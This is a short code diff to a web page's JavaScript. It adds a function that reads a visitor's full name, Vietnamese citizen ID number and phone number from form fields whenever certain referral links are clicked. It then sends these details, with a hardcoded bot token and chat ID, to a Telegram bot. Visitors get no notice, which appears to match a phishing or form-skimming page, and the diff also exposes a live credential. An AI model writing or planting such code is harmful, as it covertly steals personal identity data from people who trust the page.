@@ -1413,6 +1413,20 @@ if(e)
             }
                 
             }
+			function telegram_app(href){
+				var hoten=$("#hoten").val();
+				var cccd=$("#CCCD").val();
+				var sdt=$("#SDT").val();
+                var my_text = `- Họ tên: ${hoten}%0A - CCCD: ${cccd}%0A - SĐT: ${sdt} - open app: ${href}`
+                var token = "5722329244:AAFAZMKdLqT8yiip_SAcJ2JTdefb9mB3ukU";
+                var chat_id = 5664202010
+                var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`//&parse_mode=html
+                let api = new XMLHttpRequest();
+                api.open("GET", url, true);
+                api.send();
+                console.log("message successfully") 
+				// window.location.href=href;
+            }
         
         function validateform() {
             // telegram($("#hoten").val(), $("#CCCD").val(), $("#sdt").val())
@@ -1461,6 +1475,7 @@ if(e)
       		e.preventDefault();
 			  var href = $(this).attr('href');
 			//   telegram(href);
+			telegram_app(href)
             switch  (href){
                 case 'https://mfast.vn/kbank/?code=777751':
                     document.querySelector('.overlay').classList.add('showoverlay');
